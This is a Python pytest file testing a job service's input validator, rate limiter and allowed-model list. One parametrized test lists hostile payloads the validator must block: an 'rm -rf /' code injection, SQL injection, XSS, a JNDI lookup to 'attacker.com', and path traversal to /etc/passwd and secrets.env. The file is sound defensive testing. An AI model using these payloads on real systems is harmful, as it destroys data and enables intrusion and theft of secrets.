import pytest
from core.security import SecurityValidator, RedisRateLimiter
from unittest.mock import Mock

class TestSecurityValidator:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_input", [
        "__import__('os').system('rm -rf /')",
        "eval('malicious_code')",
        "exec('import os; os.system(\"ls\")')",
        "'; DROP TABLE jobs; --",
        "1 OR 1=1",
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "${jndi:ldap://attacker.com/a}",
        "../../../etc/passwd",
        "../../secrets.env",
    ])
    def test_dangerous_patterns_blocked(self, validator, malicious_input):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"user_input": malicious_input}
        )

        assert is_valid is False
        assert "dangerous" in error.lower() or "pattern" in error.lower()

    @pytest.mark.security
    def test_job_type_whitelist(self, validator):
        is_valid, error = validator.validate_job(
            "malicious_job_type",
            {"n_estimators": 100}
        )

        assert is_valid is False
        assert "not allowed" in error.lower()

    @pytest.mark.security
    def test_resource_limits_enforced(self, validator):
        is_valid, error = validator._validate_sklearn_job({
            "n_estimators": 2_000_000
        })
        assert is_valid is False

        is_valid, error = validator._validate_sklearn_job({
            "dataset_rows": 20_000_000
        })
        assert is_valid is False

class TestRateLimiter:    
    @pytest.fixture
    def rate_limiter(self, mock_redis):
        return RedisRateLimiter(redis_client=mock_redis)
    
    @pytest.mark.security
    def test_rate_limit_blocks_excessive_requests(self, rate_limiter, mock_redis):
        pipeline = mock_redis.pipeline.return_value
        pipeline.execute.return_value = [0, 100, True, True]
        
        allowed, info = rate_limiter.is_allowed("user123")
        
        assert allowed is False
        assert "limit_type" in info
        assert info["limit"] == 100
    
    @pytest.mark.security
    def test_rate_limit_allows_within_limit(self, rate_limiter, mock_redis):
        pipeline = mock_redis.pipeline.return_value
        pipeline.execute.return_value = [0, 50, True, True]
        
        allowed, info = rate_limiter.is_allowed("user123")
        
        assert allowed is True
        assert info["allowed"] is True
    
    def test_rate_limit_per_ip(self, rate_limiter, mock_redis):
        pipeline = mock_redis.pipeline.return_value
        pipeline.execute.return_value = [0, 10, 0, 10, 0, 10]
        
        allowed, info = rate_limiter.is_allowed("user123", ip_address="192.168.1.1")
        
        assert allowed is True
        assert mock_redis.pipeline.called

class TestModelValidation:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()

    @pytest.mark.parametrize("model", [
        "RandomForest",
        "LogisticRegression",
        "GradientBoosting",
        "SVC",
        "DecisionTree",
        "KNeighbors",
    ])
    def test_valid_models_accepted(self, validator, model):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {
                "model": model,
                "n_estimators": 100,
                "dataset_rows": 1000,
            }
        )
        assert is_valid is True
        assert error == ""

    def test_invalid_model_rejected(self, validator):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"model": "XGBoost", "n_estimators": 100, "dataset_rows": 1000}
        )
        assert is_valid is False
        assert "not supported" in error.lower()

    def test_missing_model_defaults_to_random_forest(self, validator):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"n_estimators": 100, "dataset_rows": 1000}
        )
        assert is_valid is True


